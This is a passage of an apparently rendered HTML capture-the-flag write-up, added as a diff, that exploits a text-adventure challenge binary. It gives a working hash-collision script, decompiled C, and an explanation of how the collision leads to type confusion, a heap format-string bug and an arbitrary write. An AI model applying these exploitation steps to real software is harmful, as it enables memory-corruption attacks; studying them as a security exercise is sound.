+            <span class="n">hashed</span> <span class="o">=</span> <span class="mi">16</span> <span class="o">*</span> <span class="n">hashed</span>                                <span class="c1"># 2
+</span>            <span class="n">hashed</span> <span class="o">=</span> <span class="n">hashed</span> <span class="o">^</span> <span class="nb">ord</span> <span class="p">(</span><span class="n">obj_name</span><span class="p">[</span><span class="n">idx_name</span><span class="p">])</span> <span class="o">^</span> <span class="n">byte</span>   <span class="c1"># 3
+</span>            <span class="n">hashed</span> <span class="o">=</span> <span class="n">hashed</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
+
+        <span class="k">return</span> <span class="n">hashed</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<ol>
+  <li>It initialise the hash with a default hash value corresponding to the selected object</li>
+  <li>It shifts the hash 4 bits on the left at each iteration : the last 4 bits are always first set to 0 at each iteration.</li>
+  <li>It xors 3 values : the hash, a byte of the string to hash and a byte of the initial object hash</li>
+</ol>
+
+<p>So there is some maths to do but it’s doable.</p>
+
+<p>Remember the XOR table.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>A</th>
+      <th>B</th>
+      <th>A^B</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>0</td>
+      <td>0</td>
+      <td>0</td>
+    </tr>
+    <tr>
+      <td>0</td>
+      <td>1</td>
+      <td>1</td>
+    </tr>
+    <tr>
+      <td>1</td>
+      <td>0</td>
+      <td>1</td>
+    </tr>
+    <tr>
+      <td>1</td>
+      <td>1</td>
+      <td>0</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>In order to do the collision, the idea is to collide/”write” the hash 4 bits at a time.
+First, we always like to start from a known point of reference.
+I would thus like to initialize our hash to 0.
+Once it’s 0, we can write/collide our hash 4 bits at a time.</p>
+
+<h3 id="set-the-hash-to-0">Set the hash to 0</h3>
+
+<p>We know that our hash is shifted by 4 bits at each iteration so we can use that characteristic to set our hash to zero.
+If we shift any 32 bits value 4 bits at a time and repeat this procedure 8 times, it becomes 0 due to how SHL operation works on processors ;).</p>
+
+<p>We first need to zero out this term:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+</pre></td><td class="code"><pre><span class="nb">ord</span> <span class="p">(</span><span class="n">obj_name</span><span class="p">[</span><span class="n">idx_name</span><span class="p">])</span> <span class="o">^</span> <span class="n">byte</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<p>To do that, if our string byte is the same, then it’s nulled.</p>
+
+<p>Let’s say our initial_hash = 0xFFD1CC90 and our object name is  0xFFD1CC90FFD1CC90.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0xFFD1CC90
+
+// iteration 0
+// 16 * hashed
+0xFFD1CC90 &lt;&lt; 4 = 0xFD1CC900
+// ord (obj_name[idx_name]) ^ byte
+0xFF ^ 0xFF = 0
+// hashed ^ ord (obj_name[idx_name]) ^ byte
+0xFD1CC900 ^ 0 = 0xFD1CC900
+
+
+// iteration 1
+// 16 * hashed
+0xFD1CC900 &lt;&lt; 4 = 0xD1CC9000
+// ord (obj_name[idx_name]) ^ byte
+0xD1 ^ 0xD1 = 0
+// hashed ^ ord (obj_name[idx_name]) ^ byte
+0xD1CC9000 ^ 0 = 0xD1CC9000
+
+etc</code></pre></figure>
+
+<p>We set our last byte to 0, we continue this process and we’ll get our hash to 0.</p>
+
+<h3 id="collision">Collision</h3>
+
+<p>Ok now we got our hash to 0, we now want to collide the hash 4 bits at a time.</p>
+
+<p>Let’s say we want to collide a “Revolver” with name “MyGun” to a “Target” kind.</p>
+
+<p>We want the following:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="code"><pre><span class="n">create_hash</span> <span class="p">(</span><span class="s">'Revolver'</span><span class="p">,</span> <span class="s">'MyGun'</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0xC9D6CE5E</span>
+<span class="n">create_hash</span> <span class="p">(</span><span class="s">'Target'</span><span class="p">,</span> <span class="n">name_collider</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0xC9D6CE5E</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<p>We look up our object initial hashes table to get our initial hash for Target:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="code"><pre><span class="k">class</span> <span class="nc">Pwner</span> <span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">__init__</span> <span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">obj_magic</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="s">'Revolver'</span>          <span class="p">:</span> <span class="mh">0xFFD1CC90</span><span class="p">,</span>
+            <span class="s">'Bullet'</span>            <span class="p">:</span> <span class="mh">0xA060E1B3</span><span class="p">,</span>
+            <span class="s">'Tissue'</span>            <span class="p">:</span> <span class="mh">0x0A17B609</span><span class="p">,</span>
+            <span class="s">'MagnifyingGlass'</span>   <span class="p">:</span> <span class="mh">0x55754F83</span><span class="p">,</span>
+            <span class="s">'Target'</span>            <span class="p">:</span> <span class="mh">0x7D90DD54</span><span class="p">,</span>
+        <span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<p>We want to collide 0xC (start of 0xC9D6CE5E):</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x7D ^ 0xC = 0x71
+0x7D ^ 0x71 = 0xC</code></pre></figure>
+
+<p>If we repeat this procedure, we end up colliding any hash we want.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x7D ^ 0xC = 0x71
+0x7D ^ 0x71 = 0xC
+
+0x90 ^ 0x9 = 0x99
+0x90 ^ 0x99 = 0x9
+
+0xDD ^ 0xD = 0xD0
+0xDD ^ 0xD0 = 0xD
+
+0x54 ^ 0x6 = 0x52
+0x54 ^ 0x52 = 0x6</code></pre></figure>
+
+<p>We thus get the values 0x71, 0x99, 0xD0 and 0x52 for writing the 2 first bytes.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">// iteration 8
+hashed = 0
+hashed = 0 &lt;&lt; 4 = 0
+// hashed = hashed ^ ord (obj_name[idx_name]) ^ byte
+hashed = 0 ^ 0x71 ^ 0x7D = 0 ^ 0xC = 0xC
+
+// iteration 9
+hashed = 0xC &lt;&lt; 4 = 0xC0
+// hashed = hashed ^ ord (obj_name[idx_name]) ^ byte
+hashed = 0xC0 ^ 0x90 ^ 0x99 = 0xC0 ^ 0x9 = 0xC9</code></pre></figure>
+
+<p>Continuing this procedure allows us to collide any hash.</p>
+
+<h3 id="hash-collision-code">Hash Collision Code</h3>
+
+<p>This is ugly code, this can be cleaned, but it does the job given the math explained above.
+Each iteration generates 2 bytes to generate 1 collided byte. It returns the binary data necessary for obtaining the wanted hash.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+</pre></td><td class="code"><pre><span class="k">def</span> <span class="nf">collide_hash</span> <span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">obj_desc</span><span class="p">,</span> <span class="n">to_collide</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">obj_desc</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">obj_magic</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="nb">ValueError</span> <span class="p">(</span><span class="s">"Object Description doesn't exist"</span><span class="p">)</span>
+
+    <span class="n">initial_hash</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">obj_magic</span><span class="p">[</span><span class="n">obj_desc</span><span class="p">]</span>
+    <span class="c1"># allows to set the hash to 0
+</span>    <span class="n">data</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">initial_hash</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>
+
+    <span class="c1">#print 'initial_hash : 0x%x' % initial_hash
+</span>
+    <span class="n">value</span> <span class="o">=</span> <span class="n">to_collide</span>
+    <span class="n">hashed</span> <span class="o">=</span> <span class="n">initial_hash</span>
+
+    <span class="n">idx_hash</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">to_append</span> <span class="o">=</span> <span class="s">''</span>
+    <span class="k">for</span> <span class="n">idx</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
+        <span class="n">quartet0</span> <span class="o">=</span> <span class="n">get_byte</span> <span class="p">(</span><span class="n">initial_hash</span><span class="p">,</span> <span class="n">idx_hash</span> <span class="o">%</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf0</span>
+        <span class="n">quartet1</span> <span class="o">=</span> <span class="n">get_byte</span> <span class="p">(</span><span class="n">initial_hash</span><span class="p">,</span> <span class="n">idx_hash</span> <span class="o">%</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span>
+        <span class="n">idx_hash</span> <span class="o">+=</span> <span class="mi">1</span>
+
+        <span class="n">quartet2</span> <span class="o">=</span> <span class="n">get_byte</span> <span class="p">(</span><span class="n">initial_hash</span><span class="p">,</span> <span class="n">idx_hash</span> <span class="o">%</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf0</span>
+        <span class="n">quartet3</span> <span class="o">=</span> <span class="n">get_byte</span> <span class="p">(</span><span class="n">initial_hash</span><span class="p">,</span> <span class="n">idx_hash</span> <span class="o">%</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span>
+        <span class="n">idx_hash</span> <span class="o">+=</span> <span class="mi">1</span>
+
+        <span class="n">q0</span> <span class="o">=</span> <span class="p">(</span><span class="n">get_byte</span> <span class="p">(</span><span class="n">to_collide</span><span class="p">,</span> <span class="n">idx</span> <span class="o">%</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span>
+        <span class="n">q1</span> <span class="o">=</span> <span class="n">get_byte</span> <span class="p">(</span><span class="n">to_collide</span><span class="p">,</span> <span class="n">idx</span> <span class="o">%</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span>
+
+        <span class="c1"># compute quartets to write
+</span>        <span class="n">byte0</span> <span class="o">=</span> <span class="n">quartet0</span> <span class="o">|</span> <span class="p">(</span><span class="n">q0</span> <span class="o">^</span> <span class="n">quartet1</span><span class="p">)</span>
+        <span class="n">byte1</span> <span class="o">=</span> <span class="n">quartet2</span> <span class="o">|</span> <span class="p">(</span><span class="n">q1</span> <span class="o">^</span> <span class="n">quartet3</span><span class="p">)</span>
+
+        <span class="n">to_append</span> <span class="o">+=</span> <span class="nb">chr</span> <span class="p">(</span><span class="n">byte0</span><span class="p">)</span>
+        <span class="n">to_append</span> <span class="o">+=</span> <span class="nb">chr</span> <span class="p">(</span><span class="n">byte1</span><span class="p">)</span>
+
+    <span class="n">data</span> <span class="o">+=</span> <span class="n">to_append</span>
+
+    <span class="s">'''
+    print "Let's check collision!"
+    hashed = create_hash (obj_desc, data)
+    if hashed == to_collide:
+        print 'Successfully collided hash : 0x</span><span class="si">%</span><span class="s">x' </span><span class="si">% </span><span class="s">to_collide
+    else:
+        print 'tocollide : 0x</span><span class="si">%</span><span class="s">x hashed : 0x</span><span class="si">%</span><span class="s">x' </span><span class="si">% </span><span class="s">(to_collide, hashed)
+    '''</span>
+
+    <span class="k">return</span> <span class="n">data</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<h2 id="type-confusion">Type Confusion</h2>
+
+<p>The idea of a type confusion is to manipulate an object as another object.
+Through the alignment of fields of some objects, we can get interesting effects as it will be showed later on.
+Type confusion is due to improper casting, hash collision, use-after-free, etc.
+It allows to get read memory/write memory/execute code primitives.</p>
+
+<p>In the function action_get(), we saw that it was possible to search objects by type or by hash.
+We can’t control the type but we can control the hash and we know how to collide hashes.
+So we can eventually make find_item_by_hash() return any object in the inventory we want and use it as another type of object.
+Spoiler : There is no type confusion in action_get().</p>
+
+<p>Looking where the function find_item_by_hash() is used, there is a call in the function get_matched_object().
+The function get_matched_object() is used in use_magnifyingglass() and in use_revolver().</p>
+
+<h3 id="get_matched_object-function">get_matched_object() function</h3>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre></td><td class="code"><pre>        <span class="k">struct</span> <span class="n">inventory_struct</span> <span class="o">*</span><span class="kr">__fastcall</span> <span class="nf">get_matched_object</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">idx_obj</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">obj_desc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">action_desc</span><span class="p">)</span>
+        <span class="p">{</span>
+          <span class="cm">/* ... */</span>
+          <span class="n">printf</span><span class="p">(</span><span class="s">"What's the ID of the %s you want to %s? &gt; "</span><span class="p">,</span> <span class="n">obj_desc</span><span class="p">,</span> <span class="n">action_desc</span><span class="p">);</span>
+<span class="cm">/* 1 */</span>   <span class="k">if</span> <span class="p">(</span> <span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="p">)</span>
+          <span class="p">{</span>
+            <span class="n">buffer</span><span class="p">[</span><span class="n">strlen</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="cm">/* 2 */</span>     <span class="k">if</span> <span class="p">(</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span> <span class="o">==</span> <span class="mi">10</span> <span class="o">&amp;&amp;</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'0'</span> <span class="o">&amp;&amp;</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'x'</span> <span class="p">)</span>
+            <span class="p">{</span>
+<span class="cm">/* 3 */</span>       <span class="n">obj_hash</span> <span class="o">=</span> <span class="n">hex_string_to_int</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+              <span class="k">if</span> <span class="p">(</span> <span class="n">obj_hash</span> <span class="p">)</span>
+              <span class="p">{</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"What's the secret of the %s that matches the ID? &gt; "</span><span class="p">,</span> <span class="n">obj_desc</span><span class="p">);</span>
+<span class="cm">/* 4 */</span>         <span class="k">if</span> <span class="p">(</span> <span class="n">fgets</span><span class="p">(</span><span class="n">obj_name</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="p">)</span>
+                <span class="p">{</span>
+                  <span class="n">obj_name</span><span class="p">[</span><span class="n">strlen</span><span class="p">(</span><span class="n">obj_name</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+                  <span class="k">if</span> <span class="p">(</span> <span class="n">strlen</span><span class="p">(</span><span class="n">obj_name</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">3</span> <span class="p">)</span>
+                  <span class="p">{</span>
+<span class="cm">/* 5 */</span>             <span class="k">if</span> <span class="p">(</span> <span class="n">create_hash</span><span class="p">(</span><span class="n">idx_obj</span><span class="p">,</span> <span class="n">obj_name</span><span class="p">)</span> <span class="o">==</span> <span class="n">obj_hash</span> <span class="p">)</span>
+                    <span class="p">{</span>
+<span class="cm">/* 6 */</span>               <span class="n">found_object</span> <span class="o">=</span> <span class="n">find_item_by_hash</span><span class="p">(</span><span class="n">obj_hash</span><span class="p">);</span>
+                      <span class="k">if</span> <span class="p">(</span> <span class="n">found_object</span> <span class="p">)</span>
+                      <span class="p">{</span>
+                        <span class="n">result</span> <span class="o">=</span> <span class="n">found_object</span><span class="p">;</span>
+                      <span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<ol>
+  <li>We submit the hash we want to collide with, this will correspond to the hash of the returned object</li>
+  <li>A hash string needs to start with ‘0x’</li>
+  <li>This gets converted to an integer and it needs to be different from 0</li>
+  <li>That’s the “name” of our object but we’ll input our string that allow us to collide the hash to get our wanted object</li>
+  <li>Using our object kind (idx_obj) initial hash and our crafted string, we get to collide and pass that check</li>
+  <li>This finds the object of our choice</li>
+</ol>
+
+<p>So we can basically return any object we want as long as it’s in the inventory.
+We could return a Bullet while we were expecting a Target.</p>
+
+<h1 id="exploitation">Exploitation</h1>
+
+<p>When reversing the binary, we find the following:</p>
+
+<ul>
+  <li>hash collision in order to trigger type confusion</li>
+  <li>we can use the arbitrary write16 only 3 times</li>
+  <li>we can use the format string only once</li>
+</ul>
+
+<h2 id="format-string-1">Format string</h2>
+
+<p>The format string original data comes from a object-&gt;detail buffer, but it is not modified or controlled.
+Thanks to the type confusion, we exploit it to confuse types between a revolver and a target.</p>
+
+<p>Let’s go back to use_magnifyingglass() code</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+</pre></td><td class="code"><pre>        <span class="kt">signed</span> <span class="n">__int64</span> <span class="kr">__fastcall</span> <span class="nf">use_magnifyingglass</span><span class="p">(</span><span class="k">struct</span> <span class="n">magnifying_glass_obj</span> <span class="o">*</span><span class="n">cur_item</span><span class="p">)</span>
+        <span class="p">{</span>
+          <span class="cm">/* ... */</span>
+<span class="cm">/* 1 */</span>   <span class="k">if</span> <span class="p">(</span> <span class="n">cur_item</span><span class="o">-&gt;</span><span class="n">is_clean</span> <span class="p">)</span>
+          <span class="p">{</span>
+<span class="cm">/* 2 */</span>     <span class="k">if</span> <span class="p">(</span> <span class="n">current_room</span> <span class="o">==</span> <span class="n">study</span> <span class="p">)</span>
+            <span class="p">{</span>
+              <span class="cm">/* ... */</span>
+              <span class="n">printf</span><span class="p">(</span><span class="s">"What kind of object do you want to look at? &gt; "</span><span class="p">);</span>
+<span class="cm">/* 3 */</span>       <span class="k">if</span> <span class="p">(</span> <span class="n">fgets</span><span class="p">(</span><span class="n">obj_name</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="p">)</span>
+              <span class="p">{</span>
+                <span class="n">obj_name</span><span class="p">[</span><span class="n">strlen</span><span class="p">(</span><span class="n">obj_name</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+                <span class="k">for</span> <span class="p">(</span> <span class="n">idx_obj</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">idx_obj</span> <span class="p">)</span>
+                <span class="p">{</span>
+                  <span class="k">if</span> <span class="p">(</span> <span class="n">idx_obj</span> <span class="o">&gt;</span> <span class="mi">4</span> <span class="p">)</span>
+                    <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+<span class="cm">/* 4 */</span>           <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">all_objects</span><span class="p">[</span><span class="n">idx_obj</span><span class="p">].</span><span class="n">desc</span><span class="p">,</span> <span class="n">obj_name</span><span class="p">)</span> <span class="p">)</span>
+                    <span class="k">break</span><span class="p">;</span>
+                <span class="p">}</span>
+<span class="cm">/* 5 */</span>         <span class="n">found_object</span> <span class="o">=</span> <span class="n">get_matched_object</span><span class="p">(</span><span class="n">all_objects</span><span class="p">[</span><span class="n">idx_obj</span><span class="p">].</span><span class="n">type</span><span class="p">,</span> <span class="n">obj_name</span><span class="p">,</span> <span class="s">"inspect"</span><span class="p">);</span>
+                <span class="k">if</span> <span class="p">(</span> <span class="n">found_object</span> <span class="p">)</span>
+                <span class="p">{</span>
+                  <span class="n">printf</span><span class="p">(</span><span class="s">"OK, you asked for the %s detail, here it is:</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">all_objects</span><span class="p">[</span><span class="n">idx_obj</span><span class="p">].</span><span class="n">desc</span><span class="p">);</span>
+<span class="cm">/* 6 */</span>           <span class="n">obj_detail</span> <span class="o">=</span> <span class="n">all_objects</span><span class="p">[</span><span class="n">idx_obj</span><span class="p">].</span><span class="n">hidden_detail</span><span class="p">(</span><span class="n">found_object</span><span class="p">);</span>
+<span class="cm">/* 7 */</span>           <span class="n">printf</span><span class="p">(</span><span class="n">obj_detail</span><span class="p">);</span>
+<span class="cm">/* 8 */</span>           <span class="n">cur_item</span><span class="o">-&gt;</span><span class="n">is_clean</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+                  <span class="n">result</span> <span class="o">=</span> <span class="mi">1LL</span><span class="p">;</span>
+                <span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<ol>
+  <li>The MagnifyingGlass needs to be cleaned before using it. We need to use a Tissue before using it.
+As long as is_clean is different than 0, then the MagnifyingGlass is considered clean.</li>
+  <li>We need to be in the study room</li>
+  <li>We choose the object we want to look at, that’s it’s detail that’s going to be used for the format string</li>
+  <li>Once we found our object kind, it leaves the loop</li>
+  <li>It looks for the object we requested</li>
+  <li>It gets the pointers to the detail buffer, which is at an offset of the heap allocated object</li>
+  <li>It uses that buffer directly, that’s our format string vulnerability (no FORTIFY_SOURCE here)</li>
+  <li>cur_iteam-&gt;is_clean is set to 0 again, so we can’t use our format string anymore (only 1 object of kind “Tissue” by default</li>
+</ol>
+
+<p>Here we’ll do a type confusion between a Target and a Revolver.
+We control the serial of the revolver so it allows us to have a small format string of 8 bytes.
+We can extend the format string by corrupting the revolver detail buffer.</p>
+
+<p>When looking at the following structures:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">00000000 target_obj      struc ; (sizeof=0x68, mappedto_9)
+00000000                                         ; XREF: use_bullet+C/o
+00000000                                         ; use_bullet+68/o
+00000000 prev            dq ?
+00000008 next            dq ?
+00000010 type            dd ?
+00000014 hash            dd ?
+00000018 desc            dq ?                    ; base 2
+00000020 target_name     dq ?                    ; XREF: create_target+38/w ; offset
+00000028 detail          db 64 dup(?)
+00000068 target_obj      ends
+00000068
+00000000 ; ---------------------------------------------------------------------------
+00000000
+00000000 revolver_obj    struc ; (sizeof=0x70, mappedto_10)
+00000000                                         ; XREF: use_bullet+C/o
+00000000                                         ; use_bullet+68/o
+00000000 prev            dq ?
+00000008 next            dq ?
+00000010 type            dd ?
+00000014 hash            dd ?
+00000018 desc            dq ?                    ; offset
+00000020 bullet          dq ?                    ; XREF: use_revolver+36/r
+00000020                                         ; use_revolver+18C/r ... ; offset
+00000028 serial_number   dq ?                    ; XREF: create_revolver+126/w
+00000030 detail          db 64 dup(?)
+00000070 revolver_obj    ends</code></pre></figure>
+
+<p>We can see that if we exploit a type confusion between a target and a revolver, target_obj.detail is aligned to revolver_obj.serial_number (which we control).</p>
+
+<p>A very important detail about the format string is that the object is allocated in the heap. It means the format string buffer is also in the heap.
+When exploiting a classic format string using the techniques in the TESO paper, the format string is written to the stack and we end up finding it after multiple “%x” popping the stack.
+In this challenge, we need to find where the format string direct parameters are located and then inject our addresses accordingly. This will be explained later in this article.</p>
+
+<h2 id="arbitrary-write-16">Arbitrary write 16</h2>
+
+<p>The write address originally comes from Target-&gt;targetname, but it is not modified or controlled.
+We do a type confusion between a bullet and a target in order to get control.</p>
+
+<p>The use_revolver() code:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre></td><td class="code"><pre>        <span class="kt">signed</span> <span class="n">__int64</span> <span class="kr">__fastcall</span> <span class="nf">use_revolver</span><span class="p">(</span><span class="k">struct</span> <span class="n">revolver_obj</span> <span class="o">*</span><span class="n">revolver_item</span><span class="p">)</span>
+        <span class="p">{</span>
+          <span class="cm">/* ... */</span>
+<span class="cm">/* 1 */</span>   <span class="k">if</span> <span class="p">(</span> <span class="n">revolver_item</span><span class="o">-&gt;</span><span class="n">bullet</span> <span class="p">)</span>
+          <span class="p">{</span>
+<span class="cm">/* 2 */</span>     <span class="k">if</span> <span class="p">(</span> <span class="n">current_room</span> <span class="o">==</span> <span class="n">hall</span> <span class="p">)</span>
+            <span class="p">{</span>
+              <span class="n">printf</span><span class="p">(</span><span class="s">"What kind of object do you want to shoot at? &gt; "</span><span class="p">);</span>
+<span class="cm">/* 3 */</span>       <span class="k">if</span> <span class="p">(</span> <span class="n">fgets</span><span class="p">(</span><span class="n">obj_desc</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="p">)</span>
+              <span class="p">{</span>
+                <span class="n">obj_desc</span><span class="p">[</span><span class="n">strlen</span><span class="p">(</span><span class="n">obj_desc</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="cm">/* 4 */</span>         <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">obj_desc</span><span class="p">,</span> <span class="n">all_objects</span><span class="p">[</span><span class="n">OBJECT_TARGET</span><span class="p">].</span><span class="n">desc</span><span class="p">)</span> <span class="p">)</span>
+                <span class="p">{</span>
+<span class="cm">/* 5 */</span>           <span class="n">found_target</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">target_obj</span> <span class="o">*</span><span class="p">)</span><span class="n">get_matched_object</span><span class="p">(</span><span class="n">all_objects</span><span class="p">[</span><span class="n">OBJECT_TARGET</span><span class="p">].</span><span class="n">type</span><span class="p">,</span> <span class="n">obj_desc</span><span class="p">,</span> <span class="s">"shoot"</span><span class="p">);</span>
+                  <span class="k">if</span> <span class="p">(</span> <span class="n">found_target</span> <span class="p">)</span>
+                  <span class="p">{</span>
+                    <span class="n">bullet_mark</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">revolver_item</span><span class="o">-&gt;</span><span class="n">bullet</span><span class="o">-&gt;</span><span class="n">mark</span><span class="p">;</span>
+<span class="cm">/* 6 */</span>             <span class="n">target_buf</span> <span class="o">=</span> <span class="n">found_target</span><span class="o">-&gt;</span><span class="n">target_name</span><span class="p">;</span>
+                    <span class="n">bullet_byte1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">bullet_mark</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+<span class="cm">/* 6 */</span>             <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">target_buf</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">bullet_mark</span><span class="p">;</span>
+<span class="cm">/* 6 */</span>             <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">target_buf</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="n">bullet_byte1</span><span class="p">;</span>
+                    <span class="cm">/* ... */</span>
+                    <span class="n">remove_instance</span><span class="p">((</span><span class="k">struct</span> <span class="n">inventory_struct</span> <span class="o">*</span><span class="p">)</span><span class="n">revolver_item</span><span class="o">-&gt;</span><span class="n">bullet</span><span class="p">);</span>
+                    <span class="n">revolver_item</span><span class="o">-&gt;</span><span class="n">bullet</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+                    <span class="n">result</span> <span class="o">=</span> <span class="mi">1LL</span><span class="p">;</span>
+                  <span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<ol>
+  <li>We need to use a bullet in order to have a loaded revolver</li>
+  <li>We need to be in the hall</li>
+  <li>We choose the object to shoot at, it can only be “Target”</li>
+  <li>It actually checks we chose an object of kind “Target” to shoot at</li>
+  <li>We’ll do a type confusion between a Target and a Bullet. We control the bullet serial and it gets used as an address</li>
